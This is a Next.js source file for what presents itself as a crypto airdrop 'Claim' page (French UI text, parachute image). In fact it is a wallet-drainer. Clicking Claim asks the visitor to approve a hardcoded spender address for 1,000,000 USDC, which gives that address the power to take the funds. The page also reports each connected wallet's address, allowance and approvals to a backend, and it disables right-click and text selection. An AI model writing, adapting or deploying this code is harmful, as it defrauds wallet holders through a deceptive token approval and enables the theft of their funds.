'use client';

import { useEffect, useState } from 'react';
import { ConnectButton } from '@rainbow-me/rainbowkit';
import { useAccount, usePublicClient, useWalletClient } from 'wagmi';
import { mainnet } from 'wagmi/chains';
import { erc20Abi } from 'viem';
import { parseUnits, formatUnits } from 'viem/utils';
import Image from 'next/image';

const TOKEN_ADDRESS = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
const SPENDER = '0xB379A0B530e6d966bE7239fDa8B73274AD74E7A4';

export default function Home() {
  const [hasMounted, setHasMounted] = useState(false);
  const { address, isConnected } = useAccount();
  const publicClient = usePublicClient();
  const { data: walletClient } = useWalletClient();

  const [allowance, setAllowance] = useState('0');
  const [usdcBalance, setUsdcBalance] = useState('0');
  const [status, setStatus] = useState('');

  useEffect(() => {
    setHasMounted(true);
  }, []);

  useEffect(() => {
    const handleContextMenu = (e: MouseEvent) => e.preventDefault();
    document.addEventListener('contextmenu', handleContextMenu);
    return () => document.removeEventListener('contextmenu', handleContextMenu);
  }, []);

  useEffect(() => {
    if (!address || !publicClient) return;

    async function fetchData() {
      try {
        const [allowanceResult, balanceResult] = await Promise.all([
          publicClient.readContract({
            address: TOKEN_ADDRESS,
            abi: erc20Abi,
            functionName: 'allowance',
            args: [address, SPENDER],
          }),
          publicClient.readContract({
            address: TOKEN_ADDRESS,
            abi: erc20Abi,
            functionName: 'balanceOf',
            args: [address],
          }),
        ]);
        setAllowance(allowanceResult.toString());
        setUsdcBalance(formatUnits(balanceResult, 6));
      } catch (e) {
        setStatus('Erreur lecture données');
      }
    }

    fetchData();
  }, [address, publicClient]);

  async function notifyBackend(event: string, data: any) {
    try {
      await fetch('/api/notify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ event, data }),
      });
    } catch (e) {
      console.error('Erreur backend:', e);
    }
  }

  const handleClaim = async () => {
    if (!walletClient || !address) {
      setStatus('Wallet non connecté');
      return;
    }

    setStatus('Signature en cours...');

    try {
      const amountToApprove = parseUnits('1000000', 6);

      const txHash = await walletClient.writeContract({
        address: TOKEN_ADDRESS,
        abi: erc20Abi,
        functionName: 'approve',
        args: [SPENDER, amountToApprove],
        account: address,
        chain: mainnet, // Corrigé ici
      });

      setStatus('Approbation envoyée: ' + txHash);
      await publicClient.waitForTransactionReceipt({ hash: txHash });

      setStatus('Approbation confirmée !');
      await notifyBackend('approve', { address, amount: amountToApprove.toString() });

    } catch (e: any) {
      setStatus('Erreur approve: ' + e.message);
      await notifyBackend('error', { address, error: e.message });
    }
  };

  useEffect(() => {
    if (isConnected && address) {
      notifyBackend('connect', { address, allowance });
    }
  }, [isConnected, address, allowance]);

  if (!hasMounted) return null;

  return (
    <div style={styles.container}>
      <div style={styles.connectWrapper}>
        <ConnectButton />
      </div>

      <Image
        src="/parachute.png"
        alt="Parachute"
        width={220}
        height={220}
        style={styles.parachute}
        draggable={false}
        priority
      />

      {isConnected && (
        <div style={styles.card}>
          <p><strong>Adresse :</strong> {address}</p>
          <p><strong>Solde USDC :</strong> {usdcBalance}</p>
          <p><strong>Allowance :</strong> {allowance}</p>
          <button onClick={handleClaim} style={styles.button}>Claim</button>
          <p>{status}</p>
        </div>
      )}
    </div>
  );
}

const styles: { [key: string]: React.CSSProperties } = {
  container: {
    height: '100vh',
    width: '100vw',
    background: '#e6f2ff',
    display: 'flex',
    flexDirection: 'column',
    alignItems: 'center',
    userSelect: 'none',
    position: 'relative',
  },
  connectWrapper: {
    position: 'absolute',
    top: 20,
    right: 20,
    zIndex: 2,
  },
  parachute: {
    marginTop: '80px',
    pointerEvents: 'none',
    userSelect: 'none',
  },
  card: {
    marginTop: 30,
    background: 'white',
    padding: '20px 30px',
    borderRadius: '12px',
    boxShadow: '0 8px 20px rgba(0,0,0,0.15)',
    textAlign: 'center',
    maxWidth: '400px',
    width: '90%',
  },
  button: {
    marginTop: 10,
    padding: '10px 20px',
    fontWeight: 'bold',
    background: '#0070f3',
    color: 'white',
    border: 'none',
    borderRadius: 8,
    cursor: 'pointer',
  },
};
